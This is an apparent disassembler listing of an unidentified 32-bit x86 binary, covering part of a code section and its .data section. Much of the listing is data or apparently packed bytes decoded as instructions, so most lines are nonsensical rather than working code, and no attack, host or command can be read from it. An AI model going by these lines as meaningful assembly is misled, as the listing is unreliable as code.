  408b73:	jmp    DWORD PTR [esp+ecx*2-0x55]
  408b77:	sahf   
  408b78:	xchg   ecx,eax
  408b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b7a:	test   esi,eax
  408b7c:	dec    ebx
  408b7d:	dec    edx
  408b7e:	es inc ebp
  408b80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b81:	call   0xb2c2:0xd746280c
  408b88:	cmp    cl,BYTE PTR [esi-0x10]
  408b8b:	dec    ebp
  408b8c:	outs   dx,BYTE PTR ds:[esi]
  408b8d:	jle    0x408b51
  408b8f:	ja     0x408b27
  408b91:	xchg   edi,eax
  408b92:	pop    eax
  408b93:	pop    esi
  408b94:	mov    bl,0x64
  408b96:	xor    esi,DWORD PTR es:[eax+0x65]
  408b9a:	push   es
  408b9b:	jae    0x408b93
  408b9d:	aad    0x9c
  408b9f:	das    
  408ba0:	jle    0x408b79
  408ba2:	pop    ebx
  408ba3:	stos   BYTE PTR es:[edi],al
  408ba4:	test   al,0xc4
  408ba6:	and    DWORD PTR [ecx+eax*1+0x6dfddd93],ebx
  408bad:	and    al,BYTE PTR [ebx-0x1b]
  408bb0:	shl    DWORD PTR [ebp+0x79],0x5b
  408bb4:	stos   BYTE PTR es:[edi],al
  408bb5:	mov    WORD PTR ds:0xd2d576d2,cs
  408bbb:	cmp    al,0x9e
  408bbd:	test   eax,0x410655d4
  408bc2:	hlt    
  408bc3:	or     al,0x81
  408bc5:	out    0x1c,eax
  408bc7:	pop    esi
  408bc8:	xchg   ecx,eax
  408bc9:	jp     0x408c1b
  408bcb:	push   es
  408bcc:	out    0xb5,al
  408bce:	in     al,0xea
  408bd0:	cmp    dl,BYTE PTR [ebp+0x7ec76d5]
  408bd6:	fsub   QWORD PTR [eax+0x551f0fab]
  408bdc:	push   ss
  408bdd:	pop    es
  408bde:	mov    ah,dh
  408be0:	shr    cl,cl
  408be2:	or     DWORD PTR [ecx],ebx
  408be4:	stos   DWORD PTR es:[edi],eax
  408be5:	or     DWORD PTR [edx-0x80],ebx
  408be8:	scas   eax,DWORD PTR es:[edi]
  408be9:	scas   eax,DWORD PTR es:[edi]
  408bea:	xor    esp,DWORD PTR [ecx+0x6a]
  408bed:	(bad)  
  408bee:	outs   dx,BYTE PTR ds:[esi]
  408bef:	stos   BYTE PTR es:[edi],al
  408bf0:	xor    eax,0x83200cd
  408bf5:	mov    WORD PTR [edx-0x1d2e372b],ss
  408bfb:	das    
  408bfc:	jmp    0x408c49
  408bfe:	xchg   ebx,eax
  408bff:	shl    BYTE PTR [eax+0x68],0xe0
  408c03:	push   ebp
  408c04:	jae    0x408c2d
  408c06:	loopne 0x408c23
  408c08:	pop    es
  408c09:	and    al,0xeb
  408c0b:	or     edi,DWORD PTR [ecx-0x19]
  408c0e:	aam    0xd5
  408c10:	push   cs
  408c11:	fwait
  408c12:	bound  edx,QWORD PTR [eax+0x50fe683f]
  408c18:	dec    esp
  408c19:	xor    bl,BYTE PTR [ebx+0x17]
  408c1c:	add    al,ch
  408c1e:	jae    0x408c24
  408c20:	push   ebp
  408c21:	sbb    BYTE PTR [ebp+esi*8-0x7c],bh
  408c25:	and    WORD PTR [edx],ax
  408c28:	pop    esi
  408c29:	mov    edx,0x9ca15784
  408c2e:	mov    WORD PTR [ecx+0x29],ss
  408c31:	jl     0x408bed
  408c33:	xchg   ebx,eax
  408c34:	aad    0x8b
  408c36:	and    dh,BYTE PTR [esi-0x20070d65]
  408c3c:	and    al,0xf2
  408c3e:	ins    BYTE PTR es:[edi],dx
  408c3f:	pop    ecx
  408c40:	xchg   edx,eax
  408c41:	lahf   
  408c42:	mov    dl,0x2e
  408c44:	inc    ebx
  408c45:	inc    ecx
  408c46:	sahf   
  408c47:	mov    BYTE PTR [ebx-0x76],bl
  408c4a:	or     al,0x1d
  408c4c:	mov    esi,0xf88a13
  408c51:	mov    eax,0xb8dfa215
  408c56:	stos   DWORD PTR es:[edi],eax
  408c57:	mov    edx,0x320dfb8b
  408c5c:	call   DWORD PTR [esi+ebp*1]
  408c5f:	lea    ecx,[ebx]
  408c61:	xchg   ebp,eax
  408c62:	adc    dh,ah
  408c64:	jno    0x408c58
  408c66:	test   al,0xf2
  408c68:	jb     0x408c3a
  408c6a:	cmp    bl,0x92
  408c6d:	push   ebx
  408c6e:	lods   al,BYTE PTR ds:[esi]
  408c6f:	sar    ch,1
  408c71:	ins    BYTE PTR es:[edi],dx
  408c72:	fcomp  DWORD PTR [esi+0x27]
  408c75:	jmp    0x373:0xb1b5e534
  408c7c:	xchg   BYTE PTR [edi-0x1c],ch
  408c7f:	xchg   ebx,eax
  408c80:	stc    
  408c81:	mov    edx,0xc3d0950e
  408c86:	and    al,0xb0
  408c88:	mov    eax,DWORD PTR [eax+0x39a94459]
  408c8e:	rcl    BYTE PTR [ecx-0x10be27be],0xf5
  408c95:	push   ds
  408c96:	sbb    BYTE PTR [ebx],bh
  408c98:	pop    eax
  408c99:	lock inc esp
  408c9b:	shl    BYTE PTR [ecx+ebx*4-0x71],1
  408c9f:	jp     0x408d1d
  408ca1:	mov    ds:0x5ea420a4,al
  408ca6:	pop    ebx
  408ca7:	leave  
  408ca8:	ret    0x10

Disassembly of section .data:

00409000 <.data>:
  409000:	push   ebp
  409001:	pop    edx
  409002:	js     0x40907e
  409004:	imul   ebx,DWORD PTR [ecx+0x4e],0x6f
  409008:	popa   
  409009:	dec    eax
  40900a:	arpl   WORD PTR [edi+0x4d],dx
  40900d:	pop    eax
  40900e:	inc    esi
  40900f:	dec    edx
  409010:	jne    0x40907d
  409012:	push   ebx
  409013:	add    BYTE PTR gs:[eax],al
  409016:	add    BYTE PTR [eax],al
  409018:	push   0x70004094
  40901d:	xchg   esp,eax
  40901e:	inc    eax
  40901f:	add    BYTE PTR [eax-0x6e],ah
  409022:	inc    eax
  409023:	add    dh,ch
  409025:	or     esi,DWORD PTR [edx-0x45b082f2]
  40902b:	dec    esi
  40902c:	pop    es
  40902d:	dec    edi
  40902e:	mov    ecx,0xbc4f2f4e
  409033:	dec    esi
  409034:	add    cl,BYTE PTR [edi+0x43]
  409037:	dec    edi
  409038:	push   ds
  409039:	dec    edi
  40903a:	inc    esi
  40903b:	dec    edi
  40903c:	jnp    0x40908d
  40903e:	inc    ebp
  40903f:	dec    edi
  409040:	mov    edx,0x5e4f4a4e
  409045:	push   edx
  409046:	pop    edi
  409047:	push   ebx
  409048:	mov    ebp,0xba4f7d4e
  40904d:	dec    esi
  40904e:	pop    es
  40904f:	dec    edi
  409050:	mov    ecx,0xbc4f2f4e
  409055:	dec    esi
  409056:	add    cl,BYTE PTR [edi+0x43]
  409059:	dec    edi
  40905a:	push   ds
  40905b:	dec    edi
  40905c:	inc    esi
  40905d:	dec    edi
  40905e:	or     eax,0xba4f454f
  409063:	dec    esi
  409064:	dec    edx
  409065:	dec    edi
  409066:	pop    esi
  409067:	bound  ebx,QWORD PTR [edi+0x63]
  40906a:	mov    ebp,0xba4f7d4e
  40906f:	dec    esi
  409070:	or     cl,BYTE PTR [edi-0x47]
  409073:	dec    esi
  409074:	jnp    0x4090c5
  409076:	mov    ebp,0x404f284e
  40907b:	dec    edi
  40907c:	mov    edx,0x5e4f444e
  409081:	jb     0x4090e2
  409083:	jae    0x4090f4
  409085:	sub    DWORD PTR [eax+eax*4+0x7c],0xffffff90
  40908a:	jge    0x40901d
  40908c:	mov    edi,0xba4f064e
  409091:	dec    esi
  409092:	push   es
  409093:	dec    edi
  409094:	mov    esi,0xbd4f284e
  409099:	dec    esi
  40909a:	jnp    0x4090eb
  40909c:	inc    ecx
  40909d:	dec    edi
  40909e:	mov    edx,0x5e4f464e
  4090a3:	sbb    BYTE PTR [edi-0x7d],0x6f
  4090a7:	xchg   ebx,eax
  4090a8:	ins    BYTE PTR es:[edi],dx
  4090a9:	nop
  4090aa:	jl     0x40904c
  4090ac:	jge    0x40904f
  4090ae:	mov    edi,0xba4f064e
  4090b3:	dec    esi
  4090b4:	push   es
  4090b5:	dec    edi
  4090b6:	mov    esi,0xbd4f284e
  4090bb:	dec    esi
  4090bc:	or     eax,0xba4f414f
  4090c1:	dec    esi
  4090c2:	inc    esi
  4090c3:	dec    edi
  4090c4:	pop    esi
  4090c5:	xchg   edx,eax
  4090c6:	pop    edi
  4090c7:	xchg   ebx,eax
  4090c8:	outs   dx,DWORD PTR ds:[esi]
  4090c9:	mov    ds:0xb07ca06c,eax
  4090ce:	jge    0x409081
  4090d0:	mov    edi,0xba4f0c4e
  4090d5:	dec    esi
  4090d6:	cs dec edi
  4090d8:	mov    ecx,0xbd4f7b4e
  4090dd:	dec    esi
  4090de:	and    eax,0xba4f404f
  4090e3:	dec    esi
  4090e4:	inc    esi
  4090e5:	dec    edi
  4090e6:	pop    esi
  4090e7:	mov    ds:0xb36fa35f,al
  4090ec:	ins    BYTE PTR es:[edi],dx
  4090ed:	mov    al,0x7c
  4090ef:	sar    BYTE PTR [ebp-0x3f],0xbf
  4090f3:	dec    esi
  4090f4:	or     al,0x4f
  4090f6:	mov    edx,0xb94f2e4e
  4090fb:	dec    esi
  4090fc:	jl     0x40914d
  4090fe:	mov    ebp,0x434f1f4e
  409103:	dec    edi
  409104:	mov    edx,0x5e4f414e
  409109:	mov    dl,0x5f
  40910b:	mov    bl,0x6f
  40910d:	ret    
  40910e:	ins    BYTE PTR es:[edi],dx
  40910f:	sar    BYTE PTR [eax+edx*8+0x7d],0xd1
  409114:	mov    edi,0xba4f0c4e
  409119:	dec    esi
  40911a:	cs dec edi
  40911c:	mov    ecx,0xbd4f0a4e
  409121:	dec    esi
  409122:	cs dec edi
  409124:	inc    eax
  409125:	dec    edi
  409126:	mov    edx,0x5e4f444e
  40912b:	ret    0xc35f
  40912e:	outs   dx,DWORD PTR ds:[esi]
  40912f:	shr    DWORD PTR [eax+edx*8+0x7c],cl
  409133:	loopne 0x4091b2
  409135:	loope  0x4090f6
  409137:	dec    esi
  409138:	or     al,0x4f
  40913a:	mov    edx,0xb94f2e4e
  40913f:	dec    esi
  409140:	or     ecx,DWORD PTR [edi-0x43]
  409143:	dec    esi
  409144:	sub    BYTE PTR [edi+0x40],cl
  409147:	dec    edi
  409148:	mov    edx,0x5e4f464e
  40914d:	rcr    BYTE PTR [edi-0x2d],cl
  409150:	outs   dx,DWORD PTR ds:[esi]
  409151:	jecxz  0x4091bf
  409153:	loopne 0x4091d1
  409155:	lock jge 0x409149
  409158:	mov    edi,0xba4f094e
  40915d:	dec    esi
  40915e:	pop    ds
  40915f:	dec    edi
  409160:	mov    ecx,0xbe4f2a4e
  409165:	dec    esi
  409166:	mov    edx,0x5e4ebf4e
  40916b:	loop   0x4091cc
  40916d:	jecxz  0x4091de
  40916f:	rep ins BYTE PTR es:[edi],dx
  409171:	lock jl 0x409174
  409174:	jge    0x409177
  409176:	jl     0x409188
  409178:	jge    0x40918b
  40917a:	mov    esi,0xba4f7f4e
  40917f:	dec    esi
  409180:	and    ecx,DWORD PTR [edi-0x48]
  409183:	dec    esi
  409184:	or     cl,BYTE PTR [edi-0x42]
  409187:	dec    esi
  409188:	sub    DWORD PTR [edi+0x43],ecx
  40918b:	dec    edi
  40918c:	mov    edx,0x5e4f414e
  409191:	add    bl,BYTE PTR [edi+0x3]
  409194:	outs   dx,DWORD PTR ds:[esi]
  409195:	adc    ebp,DWORD PTR [eax+edx*1+0x7c]
  409199:	and    BYTE PTR [ebp+0x21],bh
  40919c:	mov    edi,0x2800004e
  4091a1:	nop
  4091a2:	inc    eax
  4091a3:	add    BYTE PTR [edx+edx*4],bl
  4091a6:	inc    eax
  4091a7:	add    BYTE PTR [edx+edx*4],ah
  4091aa:	inc    eax
  4091ab:	add    BYTE PTR [esp+edx*4+0x40],dh
  4091af:	add    al,bl
  4091b1:	xchg   ebx,eax
  4091b2:	inc    eax
  4091b3:	add    BYTE PTR [esp+edx*4+0x40],ah
  4091b7:	add    BYTE PTR [edx+edx*4],al
  4091ba:	inc    eax
  4091bb:	add    BYTE PTR [eax],cl
  4091bd:	xchg   edx,eax
  4091be:	inc    eax
  4091bf:	add    BYTE PTR [esp+edx*4+0x40],bl
  4091c3:	add    BYTE PTR [edx+edx*4+0x40],ch
  4091c7:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  4091ce:	pushf  
  4091cf:	clc    
  4091d0:	and    BYTE PTR [edx-0x6c6bffc0],dl
  4091d6:	inc    eax
  4091d7:	add    BYTE PTR [eax-0x4bffbf6d],ch
  4091dd:	xchg   ebx,eax
  4091de:	inc    eax
  4091df:	add    ah,al
  4091e1:	xchg   ebx,eax
  4091e2:	inc    eax
  4091e3:	add    BYTE PTR [eax-0x6e],bl
  4091e6:	inc    eax
  4091e7:	add    BYTE PTR [eax+edx*4],ah
  4091ea:	inc    eax
  4091eb:	add    BYTE PTR [eax-0x6e],bh
  4091ee:	inc    eax
  4091ef:	add    BYTE PTR [eax-0x6e],ch
  4091f2:	inc    eax
  4091f3:	add    BYTE PTR [eax-0x6c],bh
  4091f6:	inc    eax
  4091f7:	add    BYTE PTR ds:0x90f89c85,dh
  4091fd:	or     edx,DWORD PTR [edi]
  4091ff:	sub    DWORD PTR [edx+edx*4],0x1c930040
  409206:	push   ss
  409207:	or     DWORD PTR [edi+0x7050d],0xf6004000
  409211:	mov    ss,ebx
  409213:	dec    esp
  409214:	cmp    al,0xc8
  409216:	inc    edx
  409217:	add    BYTE PTR [edx+0x7a],bl
  40921a:	ja     0x409273
  40921c:	(bad)  
  40921d:	cli    
  40921e:	jne    0x409282
  409220:	(bad)  
  409221:	in     eax,dx
  409222:	inc    BYTE PTR [edi]
  409224:	mov    esi,0x1405a3fa
  409229:	xchg   edx,eax
  40922a:	inc    eax
  40922b:	add    BYTE PTR [edx*4-0x69cb0764],dh
  409232:	pushf  
  409233:	clc    
  409234:	xor    edx,DWORD PTR [ebp-0x6acd0764]
  40923a:	pushf  
  40923b:	clc    
  40923c:	xor    DWORD PTR [ebp-0x6acf0764],edx
  409242:	pushf  
  409243:	clc    
  409244:	aas    
  409245:	xchg   ebp,eax
  409246:	pushf  
  409247:	clc    
  409248:	ds xchg ebp,eax
  40924a:	pushf  
  40924b:	clc    
  40924c:	cmp    eax,0x3cf89c95
  409251:	xchg   ebp,eax
  409252:	pushf  
  409253:	clc    
  409254:	and    eax,0xe1f89c95
  409259:	stc    
  40925a:	add    esp,DWORD PTR [eax+0x1c]
  40925d:	nop
  40925e:	inc    eax
  40925f:	add    BYTE PTR [ecx],al
  409261:	xchg   ebx,eax
  409262:	inc    edx
  409263:	add    BYTE PTR [ebx+edx*2+0x7a],dh
  409267:	dec    esp
  409268:	xor    eax,0x90f89c85
  40926d:	jmp    0x126699c2
  409272:	add    BYTE PTR [eax],al
  409274:	sbb    BYTE PTR [eax+0xb920040],dl
  40927a:	add    al,0xe
	...
  4092ac:	(bad)  
  4092ad:	mov    ds:0x42,eax
  4092b2:	add    BYTE PTR [eax],al
  4092b4:	dec    ebp
  4092b5:	add    BYTE PTR [edx+0x0],cl
  4092b8:	inc    esp
  4092b9:	add    BYTE PTR [ebx+0x0],ch
  4092bc:	ins    DWORD PTR es:[edi],dx
  4092bd:	add    BYTE PTR [eax+eax*1],ch
  4092c0:	add    BYTE PTR fs:[ebx+0x0],dh
  4092c4:	add    BYTE PTR cs:[ebx+0x0],ch
  4092c8:	popa   
  4092c9:	add    BYTE PTR [esi+0x0],ah
  4092cc:	push   0x0
  4092ce:	imul   eax,DWORD PTR [eax],0x64
  4092d1:	add    BYTE PTR [eax+eax*1+0x73],ch
  4092d5:	add    BYTE PTR [edx+0x0],ch
  4092d8:	data16 add BYTE PTR [eax+eax*1+0x6b],ch
  4092dd:	add    BYTE PTR [eax+eax*1+0x73],ah
  4092e1:	add    BYTE PTR [esi+0x0],ah
  4092e4:	add    BYTE PTR [bx+si],al
  4092e7:	add    BYTE PTR [ebx+0x0],cl
  4092ea:	push   ebp
  4092eb:	add    BYTE PTR [eax+eax*1+0x4a],al
  4092ef:	add    BYTE PTR [edi+0x0],ch
  4092f2:	imul   eax,DWORD PTR [eax],0x6a
  4092f5:	add    BYTE PTR [edx+0x0],ch
  4092f8:	ins    BYTE PTR es:[edi],dx
  4092f9:	add    BYTE PTR [ebx+0x0],ch
  4092fc:	jae    0x4092fe
  4092fe:	add    BYTE PTR fs:[edx+0x0],ch
  409302:	jae    0x409304
  409304:	popa   
  409305:	add    BYTE PTR [edi+0x0],ch
  409308:	imul   eax,DWORD PTR [eax],0x640066
  40930e:	jae    0x409310
  409310:	ins    BYTE PTR es:[edi],dx
  409311:	add    BYTE PTR [ebx+0x0],ch
  409314:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409319:	add    BYTE PTR [esi+0x0],ah
  40931c:	push   0x0
  40931e:	add    BYTE PTR fs:[ebx+0x0],dh
  409322:	ins    BYTE PTR es:[edi],dx
  409323:	add    BYTE PTR [esi+0x0],ah
  409326:	jae    0x409328
  409328:	add    BYTE PTR fs:[eax],al
  40932b:	add    BYTE PTR [ecx+ecx*2+0x44],cl
  40932f:	outs   dx,DWORD PTR ds:[esi]
  409330:	jo     0x409381
  409332:	dec    ecx
  409333:	dec    ebx
  409334:	inc    esp
  409335:	dec    ecx
  409336:	dec    edx
  409337:	ins    BYTE PTR es:[edi],dx
  409338:	imul   ebp,DWORD PTR [edx+0x6b],0x68736466
  40933f:	imul   sp,WORD PTR [si+0x0],0x0
  409346:	add    BYTE PTR [eax],al
  409348:	dec    ebx
  409349:	add    BYTE PTR [ebp+0x0],dl
  40934c:	inc    esp
  40934d:	add    BYTE PTR [edx+0x0],cl
  409350:	outs   dx,DWORD PTR ds:[esi]
  409351:	add    BYTE PTR [ebx+0x0],ch
  409354:	push   0x0
  409356:	push   0x0
  409358:	ins    BYTE PTR es:[edi],dx
  409359:	add    BYTE PTR [ebx+0x0],ch
  40935c:	jae    0x40935e
  40935e:	add    BYTE PTR fs:[edx+0x0],ch
  409362:	jae    0x409364
  409364:	popa   
  409365:	add    BYTE PTR [edi+0x0],ch
  409368:	imul   eax,DWORD PTR [eax],0x640066
  40936e:	jae    0x409370
  409370:	ins    BYTE PTR es:[edi],dx
  409371:	add    BYTE PTR [ebx+0x0],ch
  409374:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409379:	add    BYTE PTR [esi+0x0],ah
  40937c:	push   0x0
  40937e:	add    BYTE PTR fs:[ebx+0x0],dh
  409382:	ins    BYTE PTR es:[edi],dx
  409383:	add    BYTE PTR [esi+0x0],ah
  409386:	jae    0x409388
  409388:	add    BYTE PTR fs:[eax],al
  40938b:	add    BYTE PTR [eax],al
  40938d:	add    BYTE PTR [eax],al
  40938f:	add    BYTE PTR ds:0x2100406f,bl
  409395:	dec    edi
  409396:	pop    ds
  409397:	dec    edi
  409398:	sub    BYTE PTR [edi+0x24],cl
  40939b:	dec    edi
  40939c:	pop    ds
  40939d:	dec    edi
  40939e:	es dec edi
  4093a0:	imul   ecx,DWORD PTR [edi+0x68],0x4eba4f
  4093a7:	add    BYTE PTR ds:0x234f1e4f,bl
  4093ad:	dec    edi
  4093ae:	imul   ecx,DWORD PTR [edi+0x68],0x2f4eba4f
  4093b5:	dec    edi
  4093b6:	sub    DWORD PTR [edi+0x1f],ecx
  4093b9:	dec    edi
  4093ba:	sub    BYTE PTR [edi+0x69],cl
  4093bd:	dec    edi
  4093be:	push   0x4eba4f
  4093c3:	add    BYTE PTR [ecx],ch
  4093c5:	dec    edi
  4093c6:	and    cl,BYTE PTR [edi+0x26]
  4093c9:	dec    edi
  4093ca:	sub    eax,0x2a4f1b4f
  4093cf:	dec    edi
  4093d0:	and    ecx,DWORD PTR [edi-0x46]
  4093d3:	dec    esi
  4093d4:	add    BYTE PTR [eax],al
  4093d6:	add    BYTE PTR [eax],al
  4093d8:	push   cs
  4093d9:	jge    0x4093e9
  4093db:	lea    ecx,[esi]
  4093dd:	popf   
  4093de:	push   cs
  4093df:	lods   eax,DWORD PTR ds:[esi]
  4093e0:	push   cs
  4093e1:	mov    ebp,0xdd0ecd0e
  4093e6:	push   cs
  4093e7:	in     eax,dx
  4093e8:	push   cs
  4093e9:	std    
  4093ea:	push   cs
  4093eb:	or     eax,0x2d0e1d0e
  4093f0:	push   cs
  4093f1:	cmp    eax,0x6d0e5d0e
  4093f6:	push   cs
  4093f7:	jb     0x409407
  4093f9:	jae    0x409409
  4093fb:	jo     0x40940b
  4093fd:	jno    0x40940d
  4093ff:	jbe    0x40940f
  409401:	ja     0x409411
  409403:	je     0x409413
  409405:	jne    0x409415
  409407:	mov    cl,BYTE PTR [esi]
  409409:	mov    ecx,DWORD PTR [esi]
  40940b:	mov    BYTE PTR [esi],cl
  40940d:	mov    DWORD PTR [esi],ecx
  40940f:	mov    cs,WORD PTR [esi]
  409411:	jl     0x409431
  409413:	jge    0x409443
  409415:	jge    0x409455
  409417:	jge    0x409435
  409419:	(bad)  
  40941a:	jge    0x40948c
  40941c:	cmp    eax,0x79730eb1
  409421:	vptestnmw k7{k7},xmm7,QWORD PTR [eax+0x0]{1to2}
  409428:	sub    eax,0x3d56c317
  40942d:	hlt    
  40942e:	xor    dh,BYTE PTR [edi]
  409430:	xor    bh,BYTE PTR [esi-0x23]
  409433:	jno    0x409449
  409435:	mov    cl,0x70
  409437:	imul   ecx,esp,0x8
  40943a:	mov    al,ds:0x3005efd7
  40943f:	xlat   BYTE PTR ds:[ebx]
  409440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409441:	xchg   ebx,eax
  409442:	sub    al,0x11
  409444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409445:	jge    0x4093f2
  409447:	fidiv  WORD PTR [edi+0x64a6f6c9]
  40944d:	xor    dl,dl
  40944f:	pop    ds
  409450:	adc    cl,dh
  409452:	and    al,0xc6
  409454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409455:	sbb    BYTE PTR [ebp+0x71],ah
  40945b:	add    bh,ch
  40945d:	(bad)  [ebx+0x7]
  409460:	je     0x4093f4
  409462:	inc    eax
  409463:	add    BYTE PTR [edi+0x40],dl
  409466:	shl    DWORD PTR [ebx],1
  409468:	mov    bh,0x79
  40946a:	inc    edx
  40946b:	add    BYTE PTR [edx+0x62],bl
  40946e:	push   esp
  40946f:	addr16 or al,0x92
  409472:	inc    eax
  409473:	add    BYTE PTR [eax-0x6e],dh
  409476:	inc    eax
  409477:	add    BYTE PTR [edi+0x440712ed],cl
  40947d:	popa   
  40947e:	dec    eax
  40947f:	push   edi
  409480:	dec    ecx
  409481:	jne    0x4094f8
  409483:	pop    eax
  409484:	jns    0x4094d8
  409486:	dec    esp
  409487:	inc    edi
  409488:	inc    ebx
  409489:	popa   
  40948a:	jns    0x4094fb
  40948c:	push   0x42467568
  409491:	inc    esp
  409492:	inc    edx
  409493:	jne    0x409506
  409495:	push   ecx
  409496:	push   ebp
  409497:	jno    0x409502
  409499:	jb     0x4094e5
  40949b:	ins    WORD PTR es:[edi],dx
  40949d:	arpl   WORD PTR [esi+0x46],cx
  4094a0:	bound  esi,QWORD PTR [eax+0x4a]
  4094a3:	js     0x4094a5
	...
  4094b5:	add    BYTE PTR [eax],al
  4094b7:	add    BYTE PTR [ebp+0x56],al
  4094ba:	push   cx
  4094bc:	ja     0x409524
  4094be:	inc    esi
  4094bf:	gs inc ebp
  4094c1:	inc    ebx
  4094c2:	dec    ebx
  4094c3:	outs   dx,BYTE PTR ds:[esi]
  4094c4:	imul   ecx,DWORD PTR [esi+0x58],0x64
  4094c8:	push   edx
  4094c9:	dec    edx
  4094ca:	push   0x63
  4094cc:	push   0x636e707a
  4094d1:	push   ebx
  4094d2:	jne    0x40951d
  4094d4:	inc    ecx
  4094d5:	outs   dx,BYTE PTR ds:[esi]
  4094d6:	jo     0x40951b
  4094d8:	inc    ebp
  4094d9:	jp     0x40953f
  4094db:	add    BYTE PTR [eax+0x41],dh
  4094de:	dec    ecx
  4094df:	inc    edx
  4094e0:	inc    cx
  4094e2:	inc    ebx
  4094e3:	jbe    0x40953d
  4094e5:	push   eax
  4094e6:	outs   dx,BYTE PTR ds:[esi]
  4094e7:	add    BYTE PTR [edi+0x4d],al
  4094ea:	pop    edx
  4094eb:	push   0x6a
  4094ed:	jp     0x409533
  4094ef:	imul   edi,DWORD PTR [edx+0x68],0x43
  4094f3:	jbe    0x4094f5
  4094f5:	add    BYTE PTR [esi+0x6c],dh
  4094f8:	inc    ebx
  4094f9:	inc    esi
  4094fa:	popa   
  4094fb:	addr16 push ebx
  4094fd:	dec    edi
  4094fe:	imul   ecx,DWORD PTR [edx+0x4d],0x444b4758
  409505:	push   edi
  409506:	jne    0x409553
  409508:	add    BYTE PTR [eax],al
  40950a:	dec    edi
  40950b:	gs push edi
  40950d:	outs   dx,BYTE PTR fs:[esi]
  40950f:	pop    ecx
  409510:	push   esi
  409511:	push   0xc30c004d
  409516:	dec    ebp
  409517:	icebp  
  409518:	iret   
  409519:	(bad)  
  40951a:	mov    esp,0x99b5a4ff
  40951f:	loopne 0x409548
  409521:	pop    ebp
  409522:	imul   edi,DWORD PTR es:[ebp+0x48],0x0
  409527:	add    BYTE PTR [ecx+0x7],ch
  40952a:	add    BYTE PTR [eax],al
  40952c:	jb     0x4094ea
  40952e:	rcl    BYTE PTR [edx],1
  409530:	lock inc eax
  409532:	test   eax,0x5d8aabc1
  409537:	fld    QWORD PTR [ebp-0x71c98ff8]
  40953d:	ins    DWORD PTR es:[edi],dx
  40953e:	xor    DWORD PTR [edx-0x14],0xa
  409542:	into   
  409543:	rdmsr  
  409545:	fdiv   QWORD PTR [edi+0x7f]
  409548:	inc    eax
  409549:	or     BYTE PTR [ecx],bh
  40954b:	mov    dl,0x1b
  40954d:	jbe    0x40957d
  40954f:	pop    eax
  409550:	fs iret 
  409552:	pop    ds
  409553:	leave  
  409554:	std    
  409555:	rol    DWORD PTR [ebx+0x6e],0x3e
  409559:	mov    ch,0xc7
  40955b:	mov    edi,0xc4d37299
  409560:	test   ebx,ebp
  409562:	sbb    al,0xbc
  409564:	int    0x4d
  409566:	call   0xb2d08f1f
  40956b:	je     0x409553
  40956d:	ss mov cl,0x5a
  409570:	adc    edi,DWORD PTR [edi+0x66]
  409573:	pop    edi
  409574:	pop    esp
  409575:	mov    bl,ch
  409577:	loope  0x409596
  409579:	sub    BYTE PTR [ecx+ecx*8+0x2e1186c],ah
  409580:	jno    0x409544
  409582:	pop    ss
  409583:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409585:	dec    esi
  409586:	mov    WORD PTR [ebx+0x72],fs
  409589:	pop    ds
  40958a:	jecxz  0x409534
  40958c:	ins    BYTE PTR es:[edi],dx
  40958d:	outs   dx,BYTE PTR ds:[esi]
  40958e:	pop    edi
  40958f:	adc    al,0xd1
  409591:	push   edi
  409592:	jp     0x4095e5
  409594:	mov    ?,WORD PTR [edx+0x4e]
  409597:	fs jb  0x40960f
  40959a:	sub    edi,edi
  40959c:	je     0x409585
  40959e:	xchg   edx,eax
  40959f:	add    al,0xaf
  4095a1:	jns    0x40957e
  4095a3:	push   ss
  4095a4:	xlat   BYTE PTR ds:[ebx]
  4095a5:	add    bh,ch
  4095a7:	cmp    bl,dh
  4095a9:	lods   al,BYTE PTR ds:[esi]
  4095aa:	bound  edi,QWORD PTR [ebp-0x27]
  4095ad:	popf   
  4095ae:	xor    al,0x56
  4095b0:	adc    BYTE PTR [esi],dl
  4095b2:	pop    ebp
  4095b3:	fld    TBYTE PTR [eax-0xb616e11]
  4095b9:	dec    edi
  4095ba:	jmp    0x409620
  4095bc:	dec    ebp
  4095bd:	out    0x61,al
  4095bf:	or     eax,0x318f51ad
  4095c4:	aad    0xfb
  4095c6:	aas    
  4095c7:	add    BYTE PTR [edi+0x54c5a029],dl
  4095cd:	inc    ebp
  4095ce:	mov    WORD PTR [esi],?
  4095d0:	cmp    BYTE PTR ds:0xd05619e6,bl
  4095d6:	cmp    edx,DWORD PTR [ebx+0x533bb8b]
  4095dc:	push   es
  4095dd:	push   ebx
  4095de:	mov    esi,edx
  4095e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095e1:	inc    ebx
  4095e2:	leave  
  4095e3:	mov    eax,0x77732465
  4095e8:	jbe    0x40964a
  4095ea:	pop    es
  4095eb:	das    
  4095ec:	mov    dl,0x27
  4095ee:	rol    BYTE PTR [edi+0x23fe86cd],1
  4095f4:	sub    al,BYTE PTR ds:0xb03455df
  4095fa:	mov    ds:0xa5835a11,eax
  4095ff:	and    eax,0x31bbb06d
  409604:	into   
  409605:	repnz hlt 
  409607:	jae    0x4095c1
  409609:	leave  
  40960a:	je     0x40967d
  40960c:	pop    ds
  40960d:	retf   
  40960e:	lods   eax,DWORD PTR ds:[esi]
  40960f:	mov    dh,0xf1
  409611:	adc    BYTE PTR [edi-0x5],ah
  409614:	cmp    edi,DWORD PTR [edx+ebx*1]
  409617:	call   0x4031987c
  40961c:	jmp    0x4d3118cd
  409621:	cld    
  409622:	mov    al,ds:0xdb6e9024
  409627:	repnz nop
  409629:	sar    DWORD PTR [ecx],0xd0
  40962c:	rcl    BYTE PTR [esi-0x6],1
  40962f:	jo     0x409665
  409631:	cli    
  409632:	xchg   edi,eax
  409633:	sub    eax,0x77e94be3
  409638:	push   edi
  409639:	inc    ebx
  40963a:	test   DWORD PTR [edi],ebp
  40963c:	ret    
  40963d:	and    ch,ch
  40963f:	mov    cl,BYTE PTR [ebp-0x61]
  409642:	or     DWORD PTR [edx+0xc],0x2b01b002
  409649:	sub    bl,BYTE PTR [esi+0x23]
  40964c:	mov    DWORD PTR [eax+0x50],edi
  40964f:	(bad)  
  409650:	out    dx,al
